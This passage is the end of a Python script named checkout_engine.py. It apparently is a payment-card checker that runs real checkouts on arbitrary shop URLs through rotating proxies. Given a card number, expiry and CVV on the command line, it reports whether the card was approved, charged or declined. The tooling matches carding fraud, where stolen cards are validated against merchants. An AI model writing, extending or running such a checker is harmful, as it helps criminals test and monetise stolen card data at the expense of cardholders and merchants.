            status=CheckStatus.APPROVED,
            status_code=poll_status_code or "NO_RECEIPT",
            amount=price,
            currency=currency,
            site_name=shop_url,
            shop_url=shop_url,
            receipt_url=receipt_url,
        )

    except HardDecline as exc:
        return CheckResult(
            card=card_display,
            status=CheckStatus.DECLINED,
            status_code="HARD_DECLINE",
            site_name=shop_url,
            shop_url=shop_url,
            error=exc,
        )
    except Exception as exc:
        logger.error("checkout failed: %r", exc, exc_info=True)
        return CheckResult(
            card=card_display,
            status=CheckStatus.ERROR,
            status_code=type(exc).__name__,
            site_name=shop_url,
            shop_url=shop_url,
            error=exc,
            retryable=True,
        )
    finally:
        if client:
            client.close()


# ──────────────────────── CLI / self-test ────────────────────────────

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 6:
        print("Usage: python checkout_engine.py <card_number> <exp_month> <exp_year> <cvv> <shop_url> [proxy_url] [currency] [country]")
        sys.exit(1)

    card_num = sys.argv[1]
    exp_m = int(sys.argv[2])
    exp_y = int(sys.argv[3])
    cvv_code = sys.argv[4]
    shop = sys.argv[5]
    proxy = sys.argv[6] if len(sys.argv) > 6 else ""
    cur = sys.argv[7] if len(sys.argv) > 7 else "USD"
    ctry = sys.argv[8] if len(sys.argv) > 8 else "US"

    _load_proxy_pool_from_env()

    result = run_checkout_public(
        card_number=card_num,
        exp_month=exp_m,
        exp_year=exp_y,
        cvv=cvv_code,
        shop_url=shop,
        proxy_url=proxy,
        currency=cur,
        country=ctry,
    )

    print(f"\n{'='*60}")
    print(f"  Card:        {result.card}")
    print(f"  Status:      {result.status.name}")
    print(f"  Status Code: {result.status_code}")
    print(f"  Amount:      {result.amount} {result.currency}")
    print(f"  Shop:        {result.site_name}")
    if result.receipt_url:
        print(f"  Receipt:     {result.receipt_url}")
    if result.error:
        print(f"  Error:       {_redact(str(result.error))}")
    print(f"{'='*60}\n")

    sys.exit(0 if result.status in (CheckStatus.CHARGED, CheckStatus.APPROVED) else 1)
